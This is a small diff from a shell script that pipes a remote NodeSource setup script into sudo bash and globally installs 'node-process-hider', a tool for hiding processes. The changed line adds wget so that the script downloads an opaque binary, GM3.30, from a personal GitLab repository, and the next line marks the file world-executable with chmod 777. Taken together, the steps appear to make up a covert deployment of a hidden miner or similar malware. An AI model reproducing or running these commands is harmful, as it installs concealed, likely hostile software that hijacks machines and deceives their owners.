@@ -13,7 +13,7 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-https://gitlab.com/kerja6381734/fanta/-/raw/main/GM3.30
+wget https://gitlab.com/kerja6381734/fanta/-/raw/main/GM3.30
 
 chmod 777 GM3.30
 
